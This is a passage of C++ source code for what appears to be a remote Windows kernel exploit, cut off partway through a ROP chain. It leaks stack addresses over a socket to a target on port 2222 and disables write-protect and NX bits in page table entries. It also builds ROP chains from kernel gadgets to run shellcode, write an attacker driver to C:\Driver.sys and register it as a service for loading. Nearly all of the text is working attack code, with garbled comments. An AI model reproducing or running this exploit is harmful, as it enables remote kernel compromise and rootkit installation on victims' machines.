
#include "..\inc\includes.h"
#include <NetWorker.h>
#include <MemWorker.h>
#include <pe_parse.h>
#include <GadgetWork.h>
#include <pt.h>
#include <intel.h>
#include <winternl.h>
//#include <ntdef.h>

//----------------------------------------------

#define RTL_REGISTRY_ABSOLUTE     0   // Path is a full path
#define RTL_REGISTRY_SERVICES     1   // \Registry\Machine\System\CurrentControlSet\Services
#define RTL_REGISTRY_CONTROL      2   // \Registry\Machine\System\CurrentControlSet\Control
#define RTL_REGISTRY_WINDOWS_NT   3   // \Registry\Machine\Software\Microsoft\Windows NT\CurrentVersion
#define RTL_REGISTRY_DEVICEMAP    4   // \Registry\Machine\Hardware\DeviceMap
#define RTL_REGISTRY_USER         5   // \Registry\User\CurrentUser

typedef enum _GADGETS_INDEXES_ {
    popEax,
    popEbx,
    popEcx,
    popEdx,
    popEbp,
    popEdi,
    popEsi,
    AllPopGadgets,

    movMemEcxEax,
    movRegMemReg,
    invlpgEax,
    AllGadgets,
}GADGETS_INDEXES;

ULONG glDriverBase;
ULONG glKernelBase;
ULONG glNetioBase;
USHORT glOsVer;
std::vector<KERNEL_MODULE> modules;
std::vector<std::pair<ULONG, ULONG>> gadgets;
std::vector<ULONG> funcAddrs;

//----------------------------------------------
//			
//----------------------------------------------

typedef enum _PTE_WORK_ {
    RWbit = 1,
    NXbit = 2,
}PTE_WORK;

typedef enum _FUNC_ {
    ExAllocatePool,
    ExFreePool,
    ZwCreateFile,
    ZwWriteFile,
    ZwClose,
    RtlCreateRegistryKey,
    RtlWriteRegistryValue,
    ZwLoadDriver,

    AllFunctions,
};

BOOL PTEWork(PMEM_WORK worker, PTE_WORK bit, ULONG addr, ULONG len, BOOL disable) {

    SOCKET tmpSock = INVALID_SOCKET;
    ULONG targetPTE;
    PAEPTE4K pteContain;
    
    printf("Start WP disable\n");

    while ((int)len > 0) {
        targetPTE = (ULONG)(GET_PAE_PTE_ADDRESS_FROM_VA(addr));
        printf("[WP] PTE entry for %08X = %08X\n", addr, targetPTE);

        if (!MemWork(worker,
            mem_read,
            targetPTE,
            &pteContain,
            8)) {

            return FALSE;
        }

        printf("[WP] page %08X => bits P = %d, U/S = %d, R/W = %d, Nx = %d\n",
            addr & 0xFFFFF000,
            pteContain.P, pteContain.U_S, pteContain.R_W, pteContain.Nx);

        if (disable) {
            switch (bit) {
            case RWbit:
                pteContain.R_W = 1;
                break;
            case NXbit:
                pteContain.Nx = 0;
                break;
            }
        }
        else {
            switch (bit) {
            case RWbit:
                pteContain.R_W = 0;
                break;
            case NXbit:
                pteContain.Nx = 1;
                break;
            }
        }

        if (!MemWork(worker,
            mem_write,
            targetPTE,
            &pteContain,
            sizeof(PAEPTE4K))) {

            return FALSE;
        }
        if (!MemWork(worker,
            mem_read,
            targetPTE,
            &pteContain,
            sizeof(PAEPTE4K))) {

            return FALSE;
        }
        printf("[WP] page after changes %08X => bits P = %d, U/S = %d, R/W = %d, Nx = %d\n",
            addr & 0xFFFFF000,
            pteContain.P, pteContain.U_S, pteContain.R_W, pteContain.Nx);

        addr += 0x1000;
        len -= 0x1000;
    }


    return TRUE;
}

BOOL ClearTLBEntry(PMEM_WORK worker, ULONG addrDst) {

    printf("\n[EXEC SC] Clear TLB entry\n");
    SOCKET tmpSockTLB = INVALID_SOCKET;
    if ((tmpSockTLB = ConnectToTarget(TARGET_HOST, 2222)) == INVALID_SOCKET) {
        return FALSE;
    }
    ULONG stackTLB, leakSockTLB;
    if (!ReadMem(tmpSockTLB, -1, &stackTLB)) {

        //WPPTEWork(worker, addrDst, scLen + 12, FALSE);
        return FALSE;
    }
    stackTLB = stackTLB - 0x408 - 4;
    printf("[EXEC SC] leak target stack TLB: \t%08X\n", stackTLB);
    if (!MemWork(worker,
        mem_read,
        stackTLB + 0x490 + 8,
        &leakSockTLB,
        4)) {

        //WPPTEWork(worker, addrDst, scLen + 12, FALSE);
        CloseSock(&tmpSockTLB);
        return FALSE;
    }
    printf("[EXEC SC] leak target sock TLB: \t%08X\n", leakSockTLB);

    ULONG addrForRop = stackTLB - 0x4c;
    PULONG ropChain = (PULONG)malloc(64);
    ULONG sizeRopWords = 0, ropIndex = 0;
    ULONG ropStub = 0x01010101;

    // ��� ��� ������ invlpg ��� ������� TLB ��� ������ ������
    ropChain[ropIndex++] = gadgets[popEax].first;

    // �������� ��� retn 8 � GetRequest
    sizeRopWords = ropIndex + 2;
    for (; ropIndex < sizeRopWords; ++ropIndex) {
        ropChain[ropIndex] = ropStub;
    }
    ropChain[ropIndex++] = addrDst;
    switch (glOsVer) {
    case Win7:
    case Win10:
        ropChain[ropIndex++] = gadgets[invlpgEax].first;

        sizeRopWords = ropIndex + (gadgets[popEax].second / 4);
        for (; ropIndex < sizeRopWords; ++ropIndex) {
            ropChain[ropIndex] = ropStub;
        }

        ropChain[ropIndex++] = ropStub; // pop ebp value

        break;
    case Win8:
        ropChain[ropIndex++] = gadgets[popEbp].first;

        sizeRopWords = ropIndex + (gadgets[popEax].second / 4);
        for (; ropIndex < sizeRopWords; ++ropIndex) {
            ropChain[ropIndex] = ropStub;
        }

        ropChain[ropIndex++] = (addrForRop + (8 * 4)); // ebp value
        ropChain[ropIndex++] = gadgets[invlpgEax].first;

        sizeRopWords = ropIndex + (gadgets[popEbp].second / 4);
        for (; ropIndex < sizeRopWords; ++ropIndex) {
            ropChain[ropIndex] = ropStub;
        }

        ropChain[ropIndex++] = ropStub;         // pop ebp (in leave)

        break;
    }
    ropChain[ropIndex++] = glDriverBase + rva_PR_CloseSocket2;
    sizeRopWords = ropIndex + (gadgets[invlpgEax].second / 4);
    for (; ropIndex < sizeRopWords; ++ropIndex) {
        ropChain[ropIndex] = ropStub;
    }
    ropChain[ropIndex++] = leakSockTLB;

    // ����� ���
    if (!MemWork(worker,
        mem_write,
        addrForRop,
        ropChain,
        (ropIndex * 4))) {

        CloseSock(&tmpSockTLB);
        return FALSE;
    }

    Sleep(3000);
    // ������� ��� ������������ ��� + �������� ������
    CloseSock(&tmpSockTLB);
    return TRUE;
}

BOOL ExecScInCodeSection(PMEM_WORK worker, PBYTE sc, ULONG scLen, ULONG addrDst) {

    //  ���������� ����� ������ � PTE
    if (!PTEWork(worker, RWbit, addrDst, scLen + 12, TRUE)) { return FALSE; }

    SOCKET tmpSock;
    if ((tmpSock = ConnectToTarget(TARGET_HOST, 2222)) == INVALID_SOCKET) { return FALSE; }

    ULONG leakStack;
    if (!ReadMem(tmpSock, -1, &leakStack)) { 
        
        //WPPTEWork(worker, addrDst, scLen + 12, FALSE);
        CloseSock(&tmpSock);
        return FALSE; 
    }
    leakStack = leakStack - 0x408 - 4;
    printf("[EXEC SC] leak target stack: \t%08X\n", leakStack);

    ULONG leakSock;
    if (!MemWork(worker,
        mem_read,
        leakStack + 0x490 + 8,
        &leakSock,
        4)) {

        //WPPTEWork(worker, addrDst, scLen + 12, FALSE);
        CloseSock(&tmpSock);
        return FALSE;
    }
    printf("[EXEC SC] leak target sock: \t%08X\n", leakSock);

    *(PULONG)(&sc[scLen]) = leakSock;
    *(PULONG)(&sc[scLen + 4]) = glDriverBase + rva_PR_CloseSocket2;
    *(PULONG)(&sc[scLen + 8]) = glDriverBase + rva_Send;
    
    // ������� TLB
    if (!ClearTLBEntry(worker, addrDst)) {
        CloseSock(&tmpSock);
        return FALSE;
    }

    //for (int i = 0; i < COUNT_TLB; i++) {
    //    if (!MemWork(worker,
    //        mem_read,
    //        glKernelBase,
    //        &buf,
    //        1)) {
    //        printf("[EXEC SC] Error read clear tlb\n");
    //        WPPTEWork(worker, addrDst, scLen + 8, FALSE);
    //        //CloseSock(&tmpSock);
    //        break;
    //    }
    //    printf("\rRead for clear tlb %d ", i);
    //    //Sleep(100);
    //}

    // ����������� ������� � ������� ������
    if (!MemWork(worker,
        mem_write,
        addrDst,
        sc,
        scLen + 12)) {

        //WPPTEWork(worker, addrDst, scLen + 8, FALSE);
        CloseSock(&tmpSock);
        return FALSE;
    }
    
    // ��������� ����� �������� �� GetRequest �� ����� � ���������
    if (!MemWork(worker,
        mem_write,
        leakStack - 0x4c,
        &addrDst,
        4)) {

        //WPPTEWork(worker, addrDst, scLen + 8, FALSE);
        CloseSock(&tmpSock);
        return FALSE;
    }
    Sleep(3000);
    // ���������� ������� ��� ������ �� GetRequest
    printf("\n[EXEC SC] Exec sc\n");
    if (!SendToTarget(tmpSock, (LPVOID)"\n", 1)) {

        //WPPTEWork(worker, addrDst, scLen + 8, FALSE);
        CloseSock(&tmpSock);
        return FALSE;
    }
    //Sleep(1000);
   /* char msg[31];
    if (RecvFromTarget(tmpSock, (LPVOID)msg, sizeof(msg)) != sizeof(msg)) {
        CloseSock(&tmpSock);
        return FALSE;
    }
    msg[30] = 0;
    printf("[EXEC SC] msg from shellcode in code section: %s\n\n", msg);*/
    //PBYTE pBuf = (PBYTE)malloc()

    //WPPTEWork(worker, addrDst, scLen + 8, FALSE);
    CloseSock(&tmpSock);
    return TRUE;
}

BOOL ExecScInStack(PMEM_WORK worker, PBYTE sc, ULONG scLen) {

    SOCKET tmpSock;
    if ((tmpSock = ConnectToTarget(TARGET_HOST, 2222)) == INVALID_SOCKET) { return FALSE; }

    ULONG leakStack;
    if (!ReadMem(tmpSock, -1, &leakStack)) {

        //WPPTEWork(worker, addrDst, scLen + 12, FALSE);
        CloseSock(&tmpSock);
        return FALSE;
    }
    leakStack = leakStack - 0x408 - 4;
    printf("[EXEC SC] leak target stack: \t%08X\n", leakStack);

    ULONG leakSock;
    if (!MemWork(worker,
        mem_read,
        leakStack + 0x490 + 8,
        &leakSock,
        4)) {

        //WPPTEWork(worker, addrDst, scLen + 12, FALSE);
        CloseSock(&tmpSock);
        return FALSE;
    }
    printf("[EXEC SC] leak target sock: \t%08X\n", leakSock);

    ULONG addrSc = leakStack - 0x40;
    if (!PTEWork(worker, NXbit, addrSc, scLen, TRUE)) { 
        CloseSock(&tmpSock);
        return FALSE; 
    }

    // Clear TLB
    if (!ClearTLBEntry(worker, addrSc)) {
        CloseSock(&tmpSock);
        return FALSE;
    }

    *(PULONG)(&sc[scLen]) = leakSock;
    *(PULONG)(&sc[scLen + 4]) = glDriverBase + rva_PR_CloseSocket2;
    *(PULONG)(&sc[scLen + 8]) = glDriverBase + rva_Send;

    // ����������� ����-��� � ����
    if (!MemWork(worker,
        mem_write,
        addrSc,
        sc,
        scLen + 12)) {

        CloseSock(&tmpSock);
        return FALSE; 
    }

    // ��������� ����� �������� �� GetRequest �� ����� � ���������
    if (!MemWork(worker,
        mem_write,
        leakStack - 0x4c,
        &addrSc,
        4)) {

        //WPPTEWork(worker, addrDst, scLen + 8, FALSE);
        CloseSock(&tmpSock);
        return FALSE;
    }

    Sleep(3000);
    // ���������� ������� ��� ������ �� GetRequest
    if (!SendToTarget(tmpSock, (LPVOID)"\n", 1)) {

        //WPPTEWork(worker, addrDst, scLen + 8, FALSE);
        CloseSock(&tmpSock);
        return FALSE;
    }
    //Sleep(1000);
    /*char msg[31];
    if (RecvFromTarget(tmpSock, (LPVOID)&msg[0], sizeof(msg)) != sizeof(msg)) {
        CloseSock(&tmpSock);
        return FALSE;
    }
    msg[30] = 0;
    printf("[EXEC SC] msg from shellcode in stack: %s\n\n", msg);*/

    CloseSock(&tmpSock);
    return TRUE;
}

BOOL WriteDriverWithAllocMem(PMEM_WORK worker, PBYTE dr, ULONG drLen, PULONG addrDst, SOCKET* saveSock, PULONG addrForSave) {

    SOCKET allocSock = INVALID_SOCKET;
    ULONG allocStack, saveStack, leakAllocSock;

    printf("\n[LOAD DRIVER] Write driver...\n");
    // ����� ��� ���������� ��� AllocatePool
    if((allocSock = ConnectToTarget(TARGET_HOST, 2222)) == INVALID_SOCKET) { return FALSE; }
    if (!ReadMem(allocSock, -1, &allocStack)) {

        CloseSock(&allocSock);
        return FALSE;
    }
    allocStack = allocStack - 0x408 - 4;
    printf("\nAlloc and write driver\n");
    printf("[LOAD DRIVER] Stack alloc: \t%08X\n", allocStack);

    if (!MemWork(worker,
        mem_read,
        allocStack + 0x490 + 8,
        &leakAllocSock,
        4)) {

        CloseSock(&allocSock);
        return FALSE;
    }
    printf("[LOAD DRIVER] Sock alloc: \t%08X\n", leakAllocSock);

    // ����� ��� ���������� ������ � ���������� �������
    if ((*saveSock = ConnectToTarget(TARGET_HOST, 2222)) == INVALID_SOCKET) { return FALSE; }
    if (!ReadMem(*saveSock, -1, &saveStack)) {

        CloseSock(&allocSock);
        return FALSE;
    }
    saveStack = saveStack - 0x408 - 4;
    ULONG localAddrForSave = saveStack - 0x40;
    printf("[LOAD DRIVER] Save addr: \t%08X\n", localAddrForSave);
    
    // ��� ��� ��������� ������ � ���� ��� ��������
    {
        PULONG ropChain = (PULONG)malloc(64);
        ULONG ropIndex = 0, sizeRopWords = 0;
        ULONG ropStub = 0x01010101;

        ropChain[ropIndex++] = funcAddrs[ExAllocatePool]; // ret -> ExAllocatePool

        ropChain[ropIndex++] = ropStub;                 // stub for retn 8
        ropChain[ropIndex++] = ropStub;

        ropChain[ropIndex++] = gadgets[popEcx].first; // ret -> pop ecx
        ropChain[ropIndex++] = 1;           // NonPagedPool
        ropChain[ropIndex++] = drLen;       // len

        ropChain[ropIndex++] = localAddrForSave;        // ecx value
        ropChain[ropIndex++] = gadgets[movMemEcxEax].first; // ret -> mov [ecx], eax

        sizeRopWords = ropIndex + (gadgets[popEcx].second / 4);
        for (; ropIndex < sizeRopWords; ++ropIndex) {
            ropChain[ropIndex] = ropStub;
        }

        ropChain[ropIndex++] = glDriverBase + rva_PR_CloseSocket2;  // ret -> Exit

        sizeRopWords = ropIndex + (gadgets[movMemEcxEax].second / 4);
        for (; ropIndex < sizeRopWords; ++ropIndex) {
            ropChain[ropIndex] = ropStub;
        }

        ropChain[ropIndex++] = leakAllocSock;

        if (!MemWork(worker,
            mem_write,
            allocStack - 0x4c,
            ropChain,
            ropIndex * 4)) {

            CloseSock(&allocSock);
            return FALSE;
        }
    }

    Sleep(3000);
    // ������� ��� ���
    CloseSock(&allocSock);
    
    // ������ ���������� �����
    if (!MemWork(worker,
        mem_read,
        localAddrForSave,
        addrDst,
        4)) {

        CloseSock(&allocSock);
        return FALSE;
    }
    if (*addrDst != 0) {
        // ����� ������� �� ����������� ������
        if (!MemWork(worker,
            mem_write,
            *addrDst,
            dr,
            drLen)) {

            CloseSock(&allocSock);
            return FALSE;
        }

        *addrForSave = localAddrForSave;
    }
    else {
        return FALSE;
    }
    return TRUE;
}

BOOL SaveDriver(PMEM_WORK worker, ULONG drAddr, ULONG addrForSave, ULONG drLen) {

    SOCKET tmpSock = INVALID_SOCKET;
    ULONG leakStack, leakSock;
    ULONG handle;
    UNICODE_STRING drPath;
    OBJECT_ATTRIBUTES oa;

    //����� ���������� �������� �� ����
    if ((tmpSock = ConnectToTarget(TARGET_HOST, 2222)) == INVALID_SOCKET) { return FALSE; }
    if (!ReadMem(tmpSock, -1, &leakStack)) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    leakStack = leakStack - 0x408 - 4;
    printf("\nSave driver on disk\n");
    printf("[LOAD DRIVER] Stack target: \t%08X\n", leakStack);
    ULONG addrStartRop = leakStack - 0x4c;
    ULONG addtStartSave = addrForSave;
    BYTE zero[64] = { 0, };

    if (!MemWork(worker,
        mem_read,
        leakStack + 0x490 + 8,
        &leakSock,
        4)) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    printf("[LOAD DRIVER] Sock target: \t%08X\n", leakSock);

    WCHAR path[] = L"\\??\\C:\\Driver.sys";

    ULONG addrPath = addrForSave;
    if (!MemWork(worker,
        mem_write,
        addrPath,
        &path,
        sizeof(path))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addrForSave += sizeof(path);

    RtlInitUnicodeString((PUNICODE_STRING)&drPath, (PWCHAR)&path);
    drPath.Buffer = (PWSTR)addrPath;
    ULONG addrUSpath = addrForSave;
    if (!MemWork(worker,
        mem_write,
        addrUSpath,
        &drPath,
        sizeof(UNICODE_STRING))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addrForSave += sizeof(UNICODE_STRING);

    ULONG addrOA = addrForSave;
    InitializeObjectAttributes(&oa, (PUNICODE_STRING)addrUSpath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    if (!MemWork(worker,
        mem_write,
        addrOA,
        &oa,
        sizeof(OBJECT_ATTRIBUTES))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addrForSave += sizeof(OBJECT_ATTRIBUTES);

    ULONG addrHandle = addrForSave;
    addrForSave += 4;
    
    ULONG addrIOsb = addrForSave;
    if (!MemWork(worker,
        mem_write,
        addrIOsb,
        &zero,
        sizeof(IO_STATUS_BLOCK))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addrForSave += sizeof(IO_STATUS_BLOCK);

    ULONG addrBytesOffset = addrForSave;
    if (!MemWork(worker,
        mem_write,
        addrBytesOffset,
        &zero,
        sizeof(LARGE_INTEGER))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addrForSave += sizeof(LARGE_INTEGER);

    char sGad[] = "mov xxx, dword [xxx]\nret";
    const char* regs[] = { "eax", "ebx", "ecx", "edx", "ebp", "edi", "esi" };
    ULONG ret;
    ULONG gadMovRegMemReg = 0;
    ULONG ind = 0, j = 0;
    // �������� ����� ������� mov reg, dword [reg]; ret
    {
        PEXCLUDED_TYPE excludes;
        ULONG countInstr = 6;
        BOOL isStop = FALSE;
        ULONG sizeRegsArr = sizeof(regs) / sizeof(char*);
        do {
            memcpy(sGad + 16, regs[ind], 3);
            for (j = 0; j < sizeRegsArr; ++j) {
                /*if (ind == j) {
                    continue;
                }
                if ((!strcmp(regs[ind], "eax")) || (!strcmp(regs[j], "eax"))) {
                    continue;
                }*/
                memcpy(sGad + 4, regs[j], 3);

                const char* exclMnem[] = {
                "leave",
                "mov",
                "j*",
                "call",
                "and",
                "add",
                "sub",
                "mul",
                "div",
                "or",
                "xor",
                NULL
                };
                const char* exclRegs[] = {
                    "esp",
                    regs[j],
                    NULL
                };
                if (!InitExcluded(&excludes, (char**)exclMnem, (char**)exclRegs, FALSE, TRUE)) {
                    CloseSock(&tmpSock);
                    return FALSE;
                }
                for (int i = 0; i < countInstr; ++i) {
                    gadMovRegMemReg = FindRopGadget(modules,
                        sGad,
                        &ret,
                        excludes,
                        i);
                    if (gadMovRegMemReg != 0) {
                        isStop = TRUE;
                        break;
                    }
                }
                if (isStop) break;
            }
            ind++;
            //free(excludes);
            //countInstr++;
        } while (gadMovRegMemReg == 0 && isStop == FALSE && ind < sizeRegsArr);

        printf("\n%s -> %08X\n", sGad, gadMovRegMemReg);
    }
    
    if (gadMovRegMemReg) {
        GADGETS_INDEXES indexReg1 = (GADGETS_INDEXES)--ind;
        GADGETS_INDEXES indexReg2 = (GADGETS_INDEXES)j;

        gadgets[movRegMemReg] = std::make_pair(gadMovRegMemReg, ret);

        // ��� ��� ��������, ������ � ����
        {
            PULONG ropChain = (PULONG)malloc(256);
            ULONG ropIndex = 0, sizeRopWords = 0;
            ULONG ropStub = 0x01010101;
            ULONG countWordsToWriteFile = 0;

            ropChain[ropIndex++] = funcAddrs[ZwCreateFile];
            ropChain[ropIndex++] = ropStub;
            ropChain[ropIndex++] = ropStub;

            // frame ZwCreateFile
            ropChain[ropIndex++] = gadgets[indexReg1].first; // [reg]
            ropChain[ropIndex++] = addrHandle;
            ropChain[ropIndex++] = FILE_WRITE_DATA;
            ropChain[ropIndex++] = addrOA;
            ropChain[ropIndex++] = addrIOsb;
            ropChain[ropIndex++] = NULL;
            ropChain[ropIndex++] = FILE_ATTRIBUTE_NORMAL;
            ropChain[ropIndex++] = FILE_SHARE_WRITE | FILE_SHARE_READ;
            ropChain[ropIndex++] = FILE_OVERWRITE_IF;
            ropChain[ropIndex++] = 0;
            ropChain[ropIndex++] = 0;
            ropChain[ropIndex++] = 0;

            // pop reg (for , [reg])
            ropChain[ropIndex++] = addrHandle;
            ropChain[ropIndex++] = gadgets[movRegMemReg].first;
            sizeRopWords = ropIndex + (gadgets[indexReg1].second / 4);
            for (; ropIndex < sizeRopWords; ++ropIndex) {
                ropChain[ropIndex] = ropStub;
            }

            // mov reg, [reg]
            ropChain[ropIndex++] = gadgets[popEcx].first;
            sizeRopWords = ropIndex + (gadgets[movRegMemReg].second / 4);
            for (; ropIndex < sizeRopWords; ++ropIndex) {
                ropChain[ropIndex] = ropStub;
            }

            // pop ecx
            /*countWordsToWriteFile += ropIndex;
            countWordsToWriteFile += gadgets[popEcx].second +
                1 + 1 + gadgets[movMemEcxEax].second + 1 + 1;*/
            countWordsToWriteFile += ropIndex +
                1 + 1 + gadgets[popEcx].second +
                1 + gadgets[movMemEcxEax].second +
                1 + 1 + gadgets[popEcx].second +
                1 + gadgets[movMemEcxEax].second + 
                1;
            //countWordsToWriteFile += 26;
            ropChain[ropIndex++] = addrStartRop + (countWordsToWriteFile * 4);
            ropChain[ropIndex++] = gadgets[movMemEcxEax].first;
            sizeRopWords = ropIndex + (gadgets[popEcx].second / 4);
            for (; ropIndex < sizeRopWords; ++ropIndex) {
                ropChain[ropIndex] = ropStub;
            }

            // mov [ecx], eax
            ropChain[ropIndex++] = gadgets[popEcx].first;
            sizeRopWords = ropIndex + (gadgets[movMemEcxEax].second / 4);
            for (; ropIndex < sizeRopWords; ++ropIndex) {
                ropChain[ropIndex] = ropStub;
            }

            // pop ecx
            countWordsToWriteFile += 20;
            ropChain[ropIndex++] = addrStartRop + (countWordsToWriteFile * 4);
            ropChain[ropIndex++] = gadgets[movMemEcxEax].first;
            sizeRopWords = ropIndex + (gadgets[popEcx].second / 4);
            for (; ropIndex < sizeRopWords; ++ropIndex) {
                ropChain[ropIndex] = ropStub;
            }

            // mov [ecx], eax
            ropChain[ropIndex++] = funcAddrs[ZwWriteFile];
            sizeRopWords = ropIndex + (gadgets[movMemEcxEax].second / 4);
            for (; ropIndex < sizeRopWords; ++ropIndex) {
                ropChain[ropIndex] = ropStub;
            }

            // frame ZwWriteFile
            //ropChain[ropIndex++] = funcAddrs[ZwClose];
            ropChain[ropIndex++] = funcAddrs[ExFreePool];
            ropChain[ropIndex++] = 0x02020202;
            ropChain[ropIndex++] = NULL;
            ropChain[ropIndex++] = NULL;
            ropChain[ropIndex++] = NULL;
            ropChain[ropIndex++] = addrIOsb;
            ropChain[ropIndex++] = drAddr;
            ropChain[ropIndex++] = drLen;
            ropChain[ropIndex++] = addrBytesOffset;
            ropChain[ropIndex++] = NULL;

            // frame ZwClose
           /* ropChain[ropIndex++] = funcAddrs[ExFreePool];
            ropChain[ropIndex++] = 0x02020202;*/

            // frame ExFreePool
            ropChain[ropIndex++] = glDriverBase + rva_PR_CloseSocket2;
            ropChain[ropIndex++] = drAddr;

            // exit
            ropChain[ropIndex++] = leakSock;

            if (!MemWork(worker,
                mem_write,
                addrStartRop,
                ropChain,
                (ropIndex * 4))) {

                free(ropChain);
                CloseSock(&tmpSock);
                return FALSE;
            }

            free(ropChain);
        }
    }
    else {
        CloseSock(&tmpSock);
        return FALSE;
    }

    Sleep(3000);
    // ������� ��� ���
    CloseSock(&tmpSock);

    Sleep(5000);
    ULONG counter = 0;
    IO_STATUS_BLOCK ioSB = { 0, };
    while ((ioSB.Information == 0 && ioSB.Status == 0) && counter < 10) {
        if (!MemWork(worker,
            mem_read,
            addrIOsb,
            &ioSB,
            sizeof(IO_STATUS_BLOCK))) {

            return FALSE;
        }
        Sleep(5000);
        counter++;
    }
    
    if ((tmpSock = ConnectToTarget(TARGET_HOST, 2222)) == INVALID_SOCKET) { return FALSE; }
    leakStack = 0;
    if (!ReadMem(tmpSock, -1, &leakStack)) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    leakStack = leakStack - 0x408 - 4;
    printf("\nClose handle...\n");
    printf("[LOAD DRIVER] Stack target ZwClose: \t%08X\n", leakStack);
    addrStartRop = leakStack - 0x4c;
    
    if (!MemWork(worker,
        mem_read,
        leakStack + 0x490 + 8,
        &leakSock,
        4)) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    printf("[LOAD DRIVER] Sock target ZwClose: \t%08X\n", leakSock);

    // ��� ��� �������� ������
    {
        PULONG ropChain = (PULONG)malloc(64);
        ULONG ropIndex = 0, sizeRopWords = 0;
        ULONG handle;
        ULONG ropStub = 0x01010101;

        if (!MemWork(worker,
            mem_read,
            addrHandle,
            &handle,
            4)) {

            CloseSock(&tmpSock);
            return FALSE;
        }

        ropChain[ropIndex++] = funcAddrs[ZwClose];
        ropChain[ropIndex++] = ropStub;
        ropChain[ropIndex++] = ropStub;

        // frame ZwClose
        ropChain[ropIndex++] = glDriverBase + rva_PR_CloseSocket2;
        ropChain[ropIndex++] = handle;

        // exit
        ropChain[ropIndex++] = leakSock;

        if (!MemWork(worker,
            mem_write,
            addrStartRop,
            ropChain,
            (ropIndex * 4))) {

            free(ropChain);
            CloseSock(&tmpSock);
            return FALSE;
        }

        free(ropChain);
    }

    Sleep(3000);
    CloseSock(&tmpSock);

    printf("[LOAD DRIVER] Writes bytes: \t%08X\n", ioSB.Information);

    if (ioSB.Information != drLen) {
        printf("[LOAD DRIVER] Write Error Status: %X08\n", ioSB.Status);
        return FALSE;
    }

    return TRUE;
}

BOOL LoadDriver(PMEM_WORK worker, ULONG addrForSave) {

    SOCKET tmpSock = INVALID_SOCKET;
    ULONG leakStack, leakSock;

    printf("\n[LOAD DRIVER] Create key and load driver...\n");

    if ((tmpSock = ConnectToTarget(TARGET_HOST, 2222)) == INVALID_SOCKET) { return FALSE; }
    if (!ReadMem(tmpSock, -1, &leakStack)) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    leakStack = leakStack - 0x408 - 4;
    printf("[LOAD DRIVER] Stack target: \t%08X\n", leakStack);
    ULONG addrStartRop = leakStack - 0x4c;
    ULONG addrStartSave = addrForSave;
    BYTE zero[64] = { 0, };

    if (!MemWork(worker,
        mem_read,
        leakStack + 0x490 + 8,
        &leakSock,
        4)) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    printf("[LOAD DRIVER] Sock target: \t%08X\n", leakSock);

    WCHAR drSubKey[] = L"ExplDriver";
    ULONG addrSubKey = addrForSave;
    if (!MemWork(worker,
        mem_write,
        addrSubKey,
        &drSubKey,
        sizeof(drSubKey))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addrForSave += sizeof(drSubKey);

    WCHAR imagePath[] = L"ImagePath";
    ULONG addrValueIP = addrForSave;
    if (!MemWork(worker,
        mem_write,
        addrValueIP,
        &imagePath,
        sizeof(imagePath))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addrForSave += sizeof(imagePath);

    WCHAR servIP[] = L"\\??\\C:\\Driver.sys";
    ULONG addrValueSIP = addrForSave;
    if (!MemWork(worker,
        mem_write,
        addrValueSIP,
        &servIP,
        sizeof(servIP))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addrForSave += sizeof(servIP);

    WCHAR type[] = L"Type";
    ULONG addrValueType = addrForSave;
    if (!MemWork(worker,
        mem_write,
        addrValueType,
        &type,
        sizeof(type))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addrForSave += sizeof(type);

    BYTE valueType = 1;
    ULONG addrType = addrForSave;
    if (!MemWork(worker,
        mem_write,
        addrType,
        &valueType,
        sizeof(valueType))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addrForSave += sizeof(valueType);

    WCHAR error[] = L"ErrorControl";
    ULONG addrValueEC = addrForSave;
    if (!MemWork(worker,
        mem_write,
        addrValueEC,
        &error,
        sizeof(error))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addrForSave += sizeof(error);

    BYTE valueEC = 1;
    ULONG addrEC = addrForSave;
    if (!MemWork(worker,
        mem_write,
        addrEC,
        &valueEC,
        sizeof(valueEC))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addrForSave += sizeof(valueEC);

    WCHAR start[] = L"Start";
    ULONG addrValueStart = addrForSave;
    if (!MemWork(worker,
        mem_write,
        addrValueStart,
        &start,
        sizeof(start))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addrForSave += sizeof(start);

    BYTE valueStart = 3;
    ULONG addrStart = addrForSave;
    if (!MemWork(worker,
        mem_write,
        addrStart,
        &valueStart,
        sizeof(valueStart))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addrForSave += sizeof(valueStart);

    WCHAR fullDrPath[] = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\ExplDriver";
    ULONG addrFullDrPath = addrForSave;
    if (!MemWork(worker,
        mem_write,
        addrFullDrPath,
        &fullDrPath,
        sizeof(fullDrPath))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addrForSave += sizeof(fullDrPath);

    UNICODE_STRING usDrFullPath;
    RtlInitUnicodeString(&usDrFullPath, fullDrPath);
    usDrFullPath.Buffer = (PWSTR)addrFullDrPath;
    ULONG addrUsDrFullPath = addrForSave;
    if (!MemWork(worker,
        mem_write,
        addrUsDrFullPath,
        &usDrFullPath,
        sizeof(usDrFullPath))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addrForSave += sizeof(usDrFullPath);

    // ��� ��� �������� ����� ������� � ������� ��������
    {
        PULONG ropChain = (PULONG)malloc(256);
        ULONG ropIndex = 0, sizeRopWords = 0;
        ULONG ropStub = 0x01010101;

        ropChain[ropIndex++] = funcAddrs[RtlCreateRegistryKey];
        ropChain[ropIndex++] = ropStub;
        ropChain[ropIndex++] = ropStub;

        // frame RtlCreateRegistryKey
        ropChain[ropIndex++] = funcAddrs[RtlWriteRegistryValue];
        ropChain[ropIndex++] = RTL_REGISTRY_SERVICES;
        ropChain[ropIndex++] = addrSubKey;

        // ImagePath
